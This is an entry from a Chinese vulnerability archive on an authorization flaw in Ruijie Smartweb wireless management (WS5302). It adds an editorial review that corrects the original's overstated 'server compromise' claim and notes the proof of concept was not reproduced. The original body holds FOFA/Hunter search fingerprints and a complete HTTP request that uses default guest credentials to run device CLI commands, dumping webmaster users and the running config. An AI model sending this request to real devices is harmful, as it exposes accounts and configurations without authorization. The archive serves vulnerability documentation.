---
source: "wy876 漏洞文库"
id: "vw-035cdd80b90811aa5df3e4f2"
entity_id: "ve-035cdd80b90811aa5df3e4f2"
schema_version: "1"
fofa_unverified: "app.name="
title: "锐捷 Smartweb 已认证设备 CLI 调用与授权边界"
product: "Ruijie Smartweb / 样例WS5302"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "guest/guest Basic与Cookie；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/cdukm3k8snxldkns"
source_status: "recorded"
---

# 锐捷 Smartweb 已认证设备 CLI 调用与授权边界

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie Smartweb / 样例WS5302
- 本文讨论：guest越权WEB_VMS/LEVEL15读取配置
- 版本、权限与配置前提：guest/guest Basic与Cookie；版本未知
- 资料类型：越权设备CLI PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 给出均为设备CLI，不能直接称OS任意代码执行/服务器失陷
- base64解码后登录未展示具体返回字段，认证Basic只是guest/guest编码
- 与NBR1300G同LEVEL15请求族可关联，产品/命令users与user差异保留
- Hunter语法粘连/元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 角色等级/固件矩阵/密文格式待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞描述
锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷Smartweb系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。

# 二、影响版本
+ 锐捷网络股份有限公司 无线smartweb管理系统

# 三、资产测绘
```java
hunterapp.name="Ruijie 锐捷 Smartweb"
fofa：title="无线smartWeb--登录页面"
```

+ 登录页面


<font style="color:rgb(34, 34, 34);">1.执行查看用户名和密码POC，show webmaster users得到回显</font>

```http
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Content-Length: 81
DNT: 1
Connection: close
Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302

command=show webmaster users&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
```


base64解码后登录系统


<font style="color:rgb(34, 34, 34);">可执行其它命令</font>

```plain
show running-config       查看当前生效的配置信息
show interface fastethernet 0/3   查看F0/3端口信息
show interface serial 1/2       查看S1/2端口信息
show interface                查看所有端口信息
show ip interface brief          以简洁方式汇总查看所有端口信息
show ip interface         查看所有端口信息
show version               查看版本信息

锐捷交换机命令参考：
https://www.bilibili.com/read/cv12330628
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cdukm3k8snxldkns>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
